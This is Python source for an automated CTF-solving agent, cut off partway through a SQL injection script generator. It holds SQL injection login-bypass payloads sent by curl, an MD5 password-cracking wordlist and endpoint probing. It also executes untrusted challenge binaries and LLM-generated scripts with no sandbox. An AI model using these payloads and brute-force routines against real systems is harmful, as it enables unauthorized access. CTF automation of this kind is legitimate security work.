"""
Reasoning-First CTF Agent
Follows workflow: Reasoning → Tool Usage → Script Writing
"""

import os
import json
import logging
import subprocess
import tempfile
from typing import Optional
from pathlib import Path

from helper.ctf_challenge import CTFChallengeClient
from helper.agent_boilerplate import AgentInterface
from helper.llm_helper import LiteLLMManager
from mcp_tools.ghidra_mcp import GhidraMCP
from mcp_tools.kali_mcp import KaliMCP


class ReasoningAgent(AgentInterface):
    """
    Agent that uses reasoning-first approach to solve CTF challenges.

    Workflow:
    1. Reasoning Phase: Analyze challenge and create solution strategy
    2. Tool Phase: Use appropriate tools (Ghidra, strings, file, etc.)
    3. Script Phase: Write and execute scripts if needed
    4. Validation Phase: Verify and submit flag
    """

    def __init__(self, lite_llm_manager: LiteLLMManager, logger: Optional[logging.Logger] = None):
        self.lite_llm_manager = lite_llm_manager
        self.logger = logger or logging.getLogger(__name__)

        # Initialize tools
        self.ghidra_mcp = GhidraMCP()
        self.kali_mcp = KaliMCP()

    def solve_challenge(self, challenge: CTFChallengeClient) -> Optional[str]:
        """Main solving method following reasoning → tools → scripts workflow."""
        self.logger.info(f"=== Reasoning Agent solving: {challenge.challenge.name} ===")
        self.logger.info(f"Description: {challenge.challenge.description}")
        self.logger.info(f"Categories: {challenge.challenge.categories}")

        try:
            # Phase 1: REASONING - Analyze and plan approach
            self.logger.info("\n=== PHASE 1: REASONING ===")
            strategy = self._reasoning_phase(challenge)
            self.logger.info(f"Strategy: {strategy}")

            # Phase 2: TOOLS - Use tools based on strategy
            self.logger.info("\n=== PHASE 2: TOOL USAGE ===")
            tool_results = self._tool_phase(challenge, strategy)
            self.logger.info(f"Tool results collected: {len(tool_results)} items")

            # Phase 3: SCRIPTS - Write and execute scripts if needed
            self.logger.info("\n=== PHASE 3: SCRIPT WRITING ===")
            script_results = self._script_phase(challenge, strategy, tool_results)

            # Phase 4: VALIDATION - Extract and validate flag
            self.logger.info("\n=== PHASE 4: VALIDATION ===")
            flag = self._validation_phase(challenge, strategy, tool_results, script_results)

            if flag:
                self.logger.info(f"✓ Flag found: {flag}")
                return flag
            else:
                self.logger.warning("✗ No flag found")
                return None

        except Exception as e:
            self.logger.error(f"Agent failed: {e}", exc_info=True)
            return None

    def _reasoning_phase(self, challenge: CTFChallengeClient) -> dict:
        """Phase 1: Use LLM to reason about the challenge and create strategy."""

        # List available artifacts
        artifacts_info = ""
        if os.path.exists(challenge.working_folder):
            artifacts = []
            for root, dirs, files in os.walk(challenge.working_folder):
                for f in files:
                    filepath = os.path.join(root, f)
                    size = os.path.getsize(filepath)
                    artifacts.append(f"  - {f} ({size} bytes)")
            artifacts_info = "\n".join(artifacts) if artifacts else "  (no files)"

        network_info = ""
        if challenge.network_info:
            network_info = f"""
Network Information:
  - Network: {challenge.network_info.get('network_name', 'N/A')}
  - Services: {', '.join(challenge.network_info.get('services_deployed', []))}
"""

        reasoning_prompt = f"""You are an expert CTF player analyzing a challenge. Use reasoning to create a solution strategy.

Challenge: {challenge.challenge.name}
Description: {challenge.challenge.description}
Categories: {challenge.challenge.categories}
Flag Format: {challenge.challenge.flag_regex}

Available Artifacts:
{artifacts_info}
{network_info}

Your task is to REASON about this challenge step-by-step:

1. ANALYZE: What type of challenge is this? What techniques are likely needed?
2. IDENTIFY: What tools or methods would be most effective?
3. PLAN: What specific steps should be taken to find the flag?

Respond in JSON format:
{{
  "challenge_type": "crypto|rev|web|pwn|forensics",
  "difficulty_assessment": "easy|medium|hard",
  "key_insights": ["insight1", "insight2"],
  "recommended_tools": ["tool1", "tool2"],
  "solution_steps": ["step1", "step2", "step3"],
  "scripts_needed": ["script_type1", "script_type2"] or []
}}

Think carefully and provide a detailed analysis."""

        llm_client = self.lite_llm_manager.create_client()
        response = llm_client.simple_call("gpt-4o-mini", reasoning_prompt)

        response_text = response.choices[0].message.content.strip()
        self.logger.info(f"LLM Reasoning:\n{response_text}\n")

        # Parse JSON response
        try:
            # Extract JSON from markdown code blocks if present
            if "```json" in response_text:
                response_text = response_text.split("```json")[1].split("```")[0].strip()
            elif "```" in response_text:
                response_text = response_text.split("```")[1].split("```")[0].strip()

            strategy = json.loads(response_text)
            return strategy
        except json.JSONDecodeError:
            self.logger.warning("Could not parse JSON strategy, using default")
            return {
                "challenge_type": "unknown",
                "recommended_tools": ["strings", "file"],
                "solution_steps": ["Analyze files", "Look for patterns"],
                "scripts_needed": []
            }

    def _tool_phase(self, challenge: CTFChallengeClient, strategy: dict) -> dict:
        """Phase 2: Execute tools based on strategy."""
        results = {}
        recommended_tools = strategy.get("recommended_tools", [])

        # Get list of artifact files
        artifact_files = []
        if os.path.exists(challenge.working_folder):
            for root, dirs, files in os.walk(challenge.working_folder):
                for f in files:
                    artifact_files.append(os.path.join(root, f))

        self.logger.info(f"Found {len(artifact_files)} artifact files")
        self.logger.info(f"Recommended tools: {recommended_tools}")

        # Run basic analysis tools on artifacts
        for artifact_path in artifact_files:
            filename = os.path.basename(artifact_path)
            results[filename] = {}

            # Read file content directly first (most reliable)
            try:
                with open(artifact_path, 'r', errors='ignore') as f:
                    file_content = f.read()
                    results[filename]['content'] = file_content

                    # Look for flag in content
                    import re
                    flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                    matches = re.findall(flag_pattern, file_content, re.IGNORECASE)
                    if matches:
                        # Filter out placeholder/fake flags
                        # Be extra cautious - only mark as candidate if file looks simple
                        for match in matches:
                            # Skip obvious fake flags
                            if '...' in match or 'xxx' in match.lower() or 'your' in match.lower():
                                continue
                            # If flag is in Python script with server code, it might be fake
                            if filename.endswith('.py') and ('HTTPServer' in file_content or 'BaseHTTPRequestHandler' in file_content):
                                self.logger.info(f"⚠️  Skipping potential fake flag in web server script {filename}: {match}")
                                continue
                            self.logger.info(f"⭐ Found flag in {filename}: {match}")
                            results[filename]['flag_candidate'] = match
                            break

                    # Check for base64 encoded data
                    import base64
                    b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', file_content)
                    for b64_str in b64_patterns[:10]:  # Limit to first 10
                        try:
                            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                            matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag in base64 decoded data: {matches[0]}")
                                results[filename]['flag_candidate'] = matches[0]
                                break
                        except:
                            pass

                    # If it's a Python file, try to execute it and analyze output
                    if filename.endswith('.py'):
                        try:
                            # Check if it's a server script
                            is_server = 'HTTPServer' in file_content or 'serve_forever' in file_content or 'socket' in file_content

                            if is_server:
                                self.logger.info(f"Detected server script {filename} - needs special handling")
                                # Don't execute server scripts directly, they'll be handled in script phase
                                results[filename]['is_server'] = True
                            else:
                                exec_result = subprocess.run(['python3', artifact_path],
                                                            capture_output=True, text=True,
                                                            timeout=10)
                                output = exec_result.stdout + exec_result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag by executing Python script: {match}")
                                            results[filename]['flag_candidate'] = match
                                            break

                                # Also check for base64 in output
                                for b64_str in re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', output):
                                    try:
                                        decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                                        matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
                                        if matches:
                                            self.logger.info(f"⭐ Found flag in Python script output (base64): {matches[0]}")
                                            results[filename]['flag_candidate'] = matches[0]
                                            break
                                    except:
                                        pass
                        except Exception as e:
                            self.logger.warning(f"Failed to execute Python script {filename}: {e}")

                    # Also check for vertical/hidden flags
                    lines = file_content.split('\n')

                    # Check first character of each line
                    vertical_first = ''.join([line[0] if line else '' for line in lines])
                    matches = re.findall(flag_pattern, vertical_first, re.IGNORECASE)
                    if matches:
                        self.logger.info(f"⭐ Found vertical flag (first char) in {filename}: {matches[0]}")
                        results[filename]['flag_candidate'] = matches[0]

                    # Check last character of each line
                    vertical_last = ''.join([line[-1] if line else '' for line in lines])
                    matches = re.findall(flag_pattern, vertical_last, re.IGNORECASE)
                    if matches:
                        self.logger.info(f"⭐ Found vertical flag (last char) in {filename}: {matches[0]}")
                        results[filename]['flag_candidate'] = matches[0]

                    # Try crypto transformations if this looks like a crypto challenge
                    if "crypto" in str(strategy.get("challenge_type", "")).lower():
                        # Try ROT13 and all Caesar shifts
                        for shift in range(26):
                            shifted = ''.join([chr((ord(c) - ord('a') + shift) % 26 + ord('a')) if 'a' <= c <= 'z'
                                             else chr((ord(c) - ord('A') + shift) % 26 + ord('A')) if 'A' <= c <= 'Z'
                                             else c for c in file_content])
                            matches = re.findall(flag_pattern, shifted, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag with ROT{shift} in {filename}: {matches[0]}")
                                results[filename]['flag_candidate'] = matches[0]
                                break

                    self.logger.info(f"Read {len(file_content)} bytes from {filename}")
            except Exception as e:
                self.logger.warning(f"Direct file read failed: {e}")

            # File command
            if "file" in str(recommended_tools).lower() or not recommended_tools:
                try:
                    file_result = subprocess.run(['file', artifact_path],
                                                capture_output=True, text=True, timeout=5)
                    results[filename]['file'] = file_result.stdout.strip()
                    self.logger.info(f"file {filename}: {file_result.stdout.strip()}")
                except Exception as e:
                    self.logger.warning(f"file command failed: {e}")

            # Strings command - try radare2 first, fallback to strings
            if "strings" in str(recommended_tools).lower() or not recommended_tools:
                try:
                    # Try radare2 for comprehensive string extraction (iz = strings in data, izz = all strings)
                    r2_result = subprocess.run(['r2', '-qc', 'iz;izz', artifact_path],
                                               capture_output=True, text=True, timeout=10)
                    if r2_result.stdout.strip():
                        strings_output = r2_result.stdout.strip().split('\n')
                    else:
                        # Fallback to regular strings command
                        strings_result = subprocess.run(['strings', artifact_path],
                                                       capture_output=True, text=True, timeout=10)
                        strings_output = strings_result.stdout.strip().split('\n')

                    results[filename]['strings'] = strings_output[:100]  # Limit output

                    # Look for flag patterns in strings
                    flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                    for string in strings_output:
                        if re.search(flag_pattern, string, re.IGNORECASE):
                            self.logger.info(f"⭐ Potential flag in strings: {string}")
                            if 'flag_candidate' not in results[filename]:
                                results[filename]['flag_candidate'] = string
                except Exception as e:
                    self.logger.warning(f"strings command failed: {e}")

            # Binary analysis for reverse engineering challenges
            is_rev_challenge = "rev" in str(strategy.get("challenge_type", "")).lower()
            is_executable = "executable" in results.get(filename, {}).get('file', '').lower() or "ELF" in results.get(filename, {}).get('file', '')

            if is_rev_challenge or is_executable:
                try:
                    # Try running the binary if it's executable
                    if os.access(artifact_path, os.X_OK) or "executable" in results.get(filename, {}).get('file', '').lower():
                        # Make it executable first
                        subprocess.run(['chmod', '+x', artifact_path], timeout=5)

                        # Try running with strings command to extract embedded data
                        strings_result = subprocess.run(['strings', artifact_path],
                                                       capture_output=True, text=True, timeout=10)
                        strings_output = strings_result.stdout

                        # Look for XOR patterns or encrypted data
                        import re
                        flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')

                        # Check strings output
                        matches = re.findall(flag_pattern, strings_output, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match:
                                    self.logger.info(f"⭐ Found flag in binary strings: {match}")
                                    results[filename]['flag_candidate'] = match
                                    break

                        # Try running the binary with common inputs
                        for test_input in ['', 'flag', 'admin', '0'*32, '1'*32]:
                            try:
                                run_result = subprocess.run([artifact_path],
                                                          input=test_input,
                                                          capture_output=True,
                                                          text=True,
                                                          timeout=5)
                                output = run_result.stdout + run_result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag by running binary: {match}")
                                            results[filename]['flag_candidate'] = match
                                            break
                            except subprocess.TimeoutExpired:
                                pass
                            except Exception as e:
                                self.logger.warning(f"Failed to run binary with input '{test_input}': {e}")

                except Exception as e:
                    self.logger.warning(f"Binary analysis failed: {e}")

        # Network scanning for web challenges
        if challenge.network_info and "web" in str(strategy.get("challenge_type", "")).lower():
            try:
                services = challenge.network_info.get('services_deployed', [])
                for service in services:
                    self.logger.info(f"Attempting to connect to service: {service}")

                    # Try common paths
                    common_paths = ['/', '/admin', '/admin.php', '/login', '/robots.txt', '/flag', '/flag.txt']
                    for path in common_paths:
                        try:
                            url = f'http://{service}{path}'
                            curl_result = subprocess.run(['curl', '-s', url],
                                                        capture_output=True, text=True, timeout=10)
                            response_text = curl_result.stdout
                            results[f'service_{service}_{path}'] = {'http_response': response_text[:1000]}
                            self.logger.info(f"HTTP {path} from {service}: {len(response_text)} bytes")

                            # Check for flag in response
                            import re
                            flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                            matches = re.findall(flag_pattern, response_text, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag in HTTP response from {url}: {matches[0]}")
                                results[f'service_{service}_{path}']['flag_candidate'] = matches[0]
                        except Exception as e:
                            self.logger.warning(f"HTTP connection to {service}{path} failed: {e}")

                    # Try SQL injection for SQL challenges
                    if "sql" in str(challenge.challenge.categories).lower():
                        sql_payloads = [
                            ("admin' OR '1'='1", "password"),
                            ("admin'--", "password"),
                            ("' OR 1=1--", "' OR 1=1--"),
                            ("admin' OR 1=1--", "anything"),
                        ]
                        for username, password in sql_payloads:
                            try:
                                # Use curl with cookie jar and follow redirects
                                curl_result = subprocess.run([
                                    'curl', '-s', '-L', '-c', '/tmp/cookies.txt', '-b', '/tmp/cookies.txt',
                                    '-X', 'POST', f'http://{service}/login',
                                    '-d', f'username={username}&password={password}'
                                ], capture_output=True, text=True, timeout=10)
                                response_text = curl_result.stdout
                                self.logger.info(f"SQL injection attempt: {username} - {len(response_text)} bytes")

                                import re
                                flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                                matches = re.findall(flag_pattern, response_text, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag via SQL injection: {match}")
                                            results[f'sqli_{service}'] = {'flag_candidate': match}
                                            break
                            except Exception as e:
                                self.logger.warning(f"SQL injection attempt failed: {e}")

            except Exception as e:
                self.logger.warning(f"Network scanning failed: {e}")

        return results

    def _script_phase(self, challenge: CTFChallengeClient, strategy: dict, tool_results: dict) -> dict:
        """Phase 3: Write and execute scripts based on strategy and tool results."""
        script_results = {}
        scripts_needed = strategy.get("scripts_needed", [])

        # Auto-detect if scripts are needed even if strategy doesn't say so
        challenge_type = strategy.get("challenge_type", "").lower()
        categories = str(challenge.challenge.categories).lower()

        # Check if we have server scripts that need interaction
        has_server_script = False
        for filename, file_results in tool_results.items():
            if file_results.get('is_server', False):
                has_server_script = True
                self.logger.info(f"Found server script {filename} requiring interaction")
                scripts_needed.append("server_interaction")
                break

        # Generate script for SQL injection if needed
        if "sql" in categories and "web" in challenge_type:
            if challenge.network_info:
                self.logger.info("Generating SQL injection script")
                scripts_needed.append("sql_injection")

        # Generate script for binary reverse engineering if needed
        if "rev" in challenge_type or "crypto" in categories:
            # Check if we have binary artifacts or Python scripts to reverse
            for filename in tool_results.keys():
                if 'content' in tool_results[filename]:
                    file_content = tool_results[filename].get('content', '')
                    # Check for hash values in Python scripts
                    if filename.endswith('.py') and ('sha' in file_content or 'md5' in file_content or 'hash' in file_content):
                        if not has_server_script:  # Prefer server_interaction over hash_reversal
                            scripts_needed.append("hash_reversal")
                        break
                    elif not filename.endswith('.txt') and not filename.endswith('.md'):
                        scripts_needed.append("binary_analysis")
                        break

        if not scripts_needed:
            self.logger.info("No scripts needed according to strategy")
            return script_results

        self.logger.info(f"Scripts to generate: {scripts_needed}")

        # Prepare context for script generation
        context = {
            "challenge": {
                "name": challenge.challenge.name,
                "description": challenge.challenge.description,
                "categories": challenge.challenge.categories,
                "flag_regex": challenge.challenge.flag_regex
            },
            "strategy": strategy,
            "tool_results_summary": self._summarize_tool_results(tool_results),
            "network_info": challenge.network_info if challenge.network_info else None
        }

        # Handle specific script types
        if "server_interaction" in scripts_needed:
            script_code = self._generate_server_interaction_script(challenge, context, tool_results)
        elif "sql_injection" in scripts_needed:
            script_code = self._generate_sql_injection_script(challenge, context)
        elif "hash_reversal" in scripts_needed:
            script_code = self._generate_hash_reversal_script(challenge, context, tool_results)
        elif "binary_analysis" in scripts_needed:
            script_code = self._generate_binary_analysis_script(challenge, context, tool_results)
        else:
            # Generic script generation
            script_prompt = f"""Based on the challenge analysis, write a Python script to solve this challenge.

Context:
{json.dumps(context, indent=2)}

Requirements:
1. Write a complete, executable Python script
2. Include error handling
3. Print the flag when found
4. Use appropriate libraries (requests, pwntools, etc. if available)

Respond with ONLY the Python script code, no explanations. Start with #!/usr/bin/env python3"""

            llm_client = self.lite_llm_manager.create_client()
            response = llm_client.simple_call("gpt-4o-mini", script_prompt)
            script_code = response.choices[0].message.content.strip()

        self.logger.info(f"Generated script:\n{script_code}\n")

        # Extract code from markdown if present
        if "```python" in script_code:
            script_code = script_code.split("```python")[1].split("```")[0].strip()
        elif "```" in script_code:
            script_code = script_code.split("```")[1].split("```")[0].strip()

        # Execute the script
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(script_code)
                script_path = f.name

            self.logger.info(f"Executing script: {script_path}")
            result = subprocess.run(['python3', script_path],
                                   capture_output=True, text=True,
                                   timeout=60,
                                   cwd=challenge.working_folder)

            script_results['output'] = result.stdout
            script_results['errors'] = result.stderr
            script_results['returncode'] = result.returncode

            self.logger.info(f"Script output:\n{result.stdout}")
            if result.stderr:
                self.logger.warning(f"Script errors:\n{result.stderr}")

            os.unlink(script_path)
        except Exception as e:
            self.logger.error(f"Script execution failed: {e}")
            script_results['error'] = str(e)

        return script_results

    def _validation_phase(self, challenge: CTFChallengeClient, strategy: dict,
                         tool_results: dict, script_results: dict) -> Optional[str]:
        """Phase 4: Extract and validate flag from all results."""
        import re

        flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
        self.logger.info(f"Looking for flag matching: {flag_pattern}")

        candidates = []

        # Check tool results
        for filename, results in tool_results.items():
            if 'flag_candidate' in results:
                candidates.append(results['flag_candidate'])

            # Check strings
            if 'strings' in results:
                for string in results['strings']:
                    if re.search(flag_pattern, string, re.IGNORECASE):
                        candidates.append(string)

        # Check script output
        if 'output' in script_results:
            for line in script_results['output'].split('\n'):
                if re.search(flag_pattern, line, re.IGNORECASE):
                    candidates.append(line.strip())

        # Validate candidates
        for candidate in candidates:
            matches = re.findall(flag_pattern, candidate, re.IGNORECASE)
            if matches:
                flag = matches[0]
                self.logger.info(f"Validating flag: {flag}")
                if challenge.submit_flag(flag):
                    return flag

        return None

    def _generate_server_interaction_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate an enhanced Python script for multi-step server interaction."""

        # Find the server script and related files
        server_file = None
        for filename, results in tool_results.items():
            if results.get('is_server', False):
                server_file = filename
                break

        # Find files with base64 or credentials
        credential_files = []
        config_files = []
        for filename, results in tool_results.items():
            content = results.get('content', '')
            if 'base64' in content or 'credentials' in content.lower() or 'encoded' in content.lower() or 'md5' in content.lower():
                credential_files.append((filename, content))
            if 'config' in content.lower() or 'json' in content.lower() or 'port' in content.lower():
                config_files.append((filename, content))

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import base64
import hashlib
import json
import time
import requests
import os
import signal
import socket
from urllib.parse import urljoin

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Server file to start
server_file = "{server_file}" if "{server_file}" else None

# Enhanced credential and configuration analysis
credentials = {{}}
server_config = {{}}

def analyze_files():
    """Analyze all files for credentials, configurations, and hints."""
    global credentials, server_config
    
    # Analyze credential files
    credential_files = {repr([(f, c[:500]) for f, c in credential_files])}
    config_files = {repr([(f, c[:500]) for f, c in config_files])}
    
    all_files = credential_files + config_files
    
    for filename, content in all_files:
        print(f"Analyzing {{filename}}...")
        
        # Look for base64 encoded data
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', content)
        for b64_str in b64_patterns:
            try:
                decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                print(f"  Base64 decoded: {{decoded}}")

                # Look for credentials pattern
                if '/' in decoded or ':' in decoded:
                    # Try different patterns
                    if '/' in decoded:
                        parts = decoded.split('/')
                        if len(parts) >= 2:
                            username = parts[0].split(':')[-1].strip()
                            password_hash = parts[1].strip()
                            credentials['username'] = username
                            credentials['password_hash'] = password_hash
                            print(f"  Found credentials: {{username}} / {{password_hash}}")

                # Check for port information
                port_match = re.search(r'port\\s+(\\d+)', decoded, re.IGNORECASE)
                if port_match:
                    server_config['port'] = int(port_match.group(1))
                    print(f"  Found port: {{server_config['port']}}")
                    
            except:
                pass

        # Look for JSON configurations
        try:
            if '{' in content and '}' in content:
                # Try to extract JSON
                json_match = re.search(r'\\{{[^}}]*\\}}', content)
                if json_match:
                    try:
                        config_data = json.loads(json_match.group())
                        if 'port' in config_data:
                            server_config['port'] = config_data['port']
                        if 'host' in config_data:
                            server_config['host'] = config_data['host']
                        if 'secret' in config_data:
                            credentials['secret'] = config_data['secret']
                        print(f"  Found JSON config: {{config_data}}")
                    except:
                        pass
        except:
            pass

        # Look for MD5 hashes directly in content
        md5_hashes = re.findall(r'["\']([a-f0-9]{{32}})["\']', content)
        if md5_hashes and 'password_hash' not in credentials:
            credentials['password_hash'] = md5_hashes[0]
            print(f"  Found MD5 hash: {{md5_hashes[0]}}")

        # Look for direct port mentions
        port_patterns = re.findall(r'port[:\\s]+(\\d+)', content, re.IGNORECASE)
        if port_patterns:
            server_config['port'] = int(port_patterns[0])
            print(f"  Found port in text: {{server_config['port']}}")

def crack_password():
    """Attempt to crack password hash."""
    global credentials
    
    if 'password_hash' not in credentials:
        return None
        
    # Extended password list for complex_1
    password_list = [
        'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
        'password123', 'admin123', 'qwerty', 'letmein', 'welcome', 'monkey',
        'dragon', '1234', '12345', 'master', 'login', 'abc123', 'password1',
        'pass', 'test', 'root', 'user', 'toor', 'changeme', 'trustno1',
        'multilayer', 'cryptovault', 'decoded', 'complex', 'challenge',
        's3cr3t', 'p@ssw0rd', 'fl4g', 'ctf', 'hack', 'exploit'
    ]
    
    print(f"Trying to crack MD5: {{credentials['password_hash']}}")
    for pwd in password_list:
        if hashlib.md5(pwd.encode()).hexdigest() == credentials['password_hash']:
            print(f"Cracked password: {{pwd}}")
            return pwd
    return None

def find_free_port(start_port=8000):
    """Find a free port starting from start_port."""
    for port in range(start_port, start_port + 100):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('localhost', port))
            sock.close()
            return port
        except:
            continue
    return start_port

def start_server():
    """Start the server script and detect its port."""
    global server_process, server_config
    
    if not server_file or not os.path.exists(server_file):
        print("No server file found")
        return None
        
    os.chmod(server_file, 0o755)
    print(f"Starting server: {{server_file}}")
    
    # Try to determine port from config or use default
    server_port = server_config.get('port', 8888)
    
    # Start server process
    server_process = subprocess.Popen(['python3', server_file],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
    
    # Wait a bit and check if server started
    time.sleep(3)
    
    # Check if process is still running
    if server_process.poll() is not None:
        print("Server process exited immediately")
        return None
    
    # Try to detect actual port if not specified
    if 'port' not in server_config:
        # Try common ports
        for test_port in [8888, 8000, 8080, 3000, 5000, 9000]:
            try:
                response = requests.get(f'http://localhost:{{test_port}}/', timeout=2)
                server_port = test_port
                print(f"Detected server on port {{test_port}}")
                break
            except:
                continue
        else:
            # If no port found, use config default
            server_port = server_config.get('port', 8888)
    
    return server_port

def interact_with_server(base_url, cracked_password):
    """Interact with the server to find the flag."""
    
    # Step 1: Try basic GET requests
    print("Step 1: Trying basic endpoints...")
    basic_endpoints = ['/', '/api', '/api/flag', '/admin', '/status', '/health']
    
    for endpoint in basic_endpoints:
        try:
            response = requests.get(f'{{base_url}}{{endpoint}}', timeout=5)
            print(f"GET {{endpoint}}: {{response.status_code}}")
            
            # Check for flag in response
            matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        print(f"Found flag in GET {{endpoint}}: {{match}}")
                        return match
                        
            # Check for API responses that might contain hints
            try:
                json_resp = response.json()
                if 'flag' in json_resp:
                    print(f"Found flag in JSON response: {{json_resp['flag']}}")
                    return json_resp['flag']
                if 'message' in json_resp:
                    print(f"  Message: {{json_resp['message']}}")
            except:
                pass
                
        except requests.exceptions.RequestException as e:
            continue

    # Step 2: Try authentication if we have credentials
    if cracked_password and credentials.get('username'):
        print(f"Step 2: Trying authentication with {{credentials['username']}}/{{cracked_password}}")
        
        auth_endpoints = ['/api/login', '/login', '/api/auth', '/auth', '/api/v1/login']
        
        for endpoint in auth_endpoints:
            # Try JSON payload
            try:
                payload = {{
                    'username': credentials['username'],
                    'password': cracked_password
                }}
                response = requests.post(f'{{base_url}}{{endpoint}}',
                                       json=payload,
                                       timeout=5)
                print(f"POST {{endpoint}} (JSON): {{response.status_code}}")
                
                # Check for flag in response
                matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(f"Found flag in auth response: {{match}}")
                            return match
                            
                # Check for token in response
                try:
                    json_resp = response.json()
                    if 'token' in json_resp:
                        token = json_resp['token']
                        print(f"Got token: {{token[:20]}}...")
                        
                        # Use token to access protected endpoints
                        protected_endpoints = ['/api/flag', '/flag', '/admin/flag', '/dashboard']
                        for prot_ep in protected_endpoints:
                            try:
                                headers = {{'Authorization': f'Bearer {{token}}'}}
                                prot_response = requests.get(f'{{base_url}}{{prot_ep}}', headers=headers, timeout=5)
                                print(f"GET {{prot_ep}} with token: {{prot_response.status_code}}")
                                
                                matches = re.findall(flag_pattern, prot_response.text, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match and 'xxx' not in match.lower():
                                            print(f"Found flag with token: {{match}}")
                                            return match
                            except:
                                continue
                                
                except:
                    pass
                    
            except requests.exceptions.RequestException:
                pass
                
            # Try form data
            try:
                payload = {{
                    'username': credentials['username'],
                    'password': cracked_password
                }}
                response = requests.post(f'{{base_url}}{{endpoint}}',
                                       data=payload,
                                       timeout=5)
                print(f"POST {{endpoint}} (form): {{response.status_code}}")
                
                matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(f"Found flag in form response: {{match}}")
                            return match
                            
            except requests.exceptions.RequestException:
                pass

    # Step 3: Try multi-step challenges
    print("Step 3: Trying multi-step interactions...")
    
    # Try to get a challenge or token first
    challenge_endpoints = ['/api/challenge', '/challenge', '/api/token', '/token']
    for ep in challenge_endpoints:
        try:
            resp = requests.get(f'{{base_url}}{{ep}}', timeout=5)
            if resp.status_code == 200:
                try:
                    json_resp = resp.json()
                    print(f"Challenge response: {{json_resp}}")
                    
                    # If we got a challenge token, try to solve it
                    if 'challenge' in json_resp:
                        # Try to solve with cracked password
                        solve_payload = {{
                            'answer': cracked_password or 'admin',
                            'token': json_resp.get('token', '')
                        }}
                        solve_resp = requests.post(f'{{base_url}}/api/solve', json=solve_payload, timeout=5)
                        matches = re.findall(flag_pattern, solve_resp.text, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match and 'xxx' not in match.lower():
                                    print(f"Found flag by solving challenge: {{match}}")
                                    return match
                except:
                    pass
        except:
            continue

    # Step 4: Try advanced API exploration
    print("Step 4: Advanced API exploration...")
    
    # Try to enumerate API endpoints
    api_endpoints = ['/api/v1', '/api/v2', '/v1', '/v2', '/api']
    for api_base in api_endpoints:
        try:
            resp = requests.get(f'{{base_url}}{{api_base}}', timeout=5)
            if resp.status_code == 200:
                print(f"Found API base: {{api_base}}")
                
                # Try common API resources
                resources = ['/flag', '/admin', '/user', '/data', '/config', '/secret']
                for resource in resources:
                    try:
                        full_ep = f'{{api_base}}{{resource}}'
                        res_resp = requests.get(f'{{base_url}}{{full_ep}}', timeout=5)
                        if res_resp.status_code == 200:
                            matches = re.findall(flag_pattern, res_resp.text, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(f"Found flag in API {{full_ep}}: {{match}}")
                                        return match
                    except:
                        continue
        except:
            continue

    return None

# Main execution
print("=== Enhanced Server Interaction for {challenge.challenge.name} ===")

# Analyze all files for hints
analyze_files()

# Try to crack any password hash
cracked_password = crack_password()

# Start the server
server_process = None
try:
    server_port = start_server()
    if not server_port:
        print("Failed to start server")
        exit(1)
        
    base_url = f'http://localhost:{{server_port}}'
    print(f"Server running at {{base_url}}")
    
    # Give server more time to fully start
    time.sleep(2)
    
    # Interact with server
    flag = interact_with_server(base_url, cracked_password)
    if flag:
        print(f"SUCCESS: {{flag}}")
        exit(0)
    else:
        print("No flag found through server interaction")
        
finally:
    # Clean up server process
    if server_process:
        print("Cleaning up server process...")
        server_process.terminate()
        try:
            server_process.wait(timeout=5)
        except:
            server_process.kill()

print("No flag found")
'''
        return script

    def _summarize_tool_results(self, tool_results: dict) -> str:
        """Create a brief summary of tool results for context."""
        summary = []
        for filename, results in tool_results.items():
            file_type = results.get('file', 'unknown')
            summary.append(f"{filename}: {file_type}")
        return "\n".join(summary)

    def _generate_sql_injection_script(self, challenge: CTFChallengeClient, context: dict) -> str:
        """Generate an enhanced Python script for SQL injection with comprehensive payload handling."""
        service = challenge.network_info.get('services_deployed', ['webapp'])[0] if challenge.network_info else 'webapp'

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import urllib.parse
import time

# Enhanced SQL Injection script for {challenge.challenge.name}
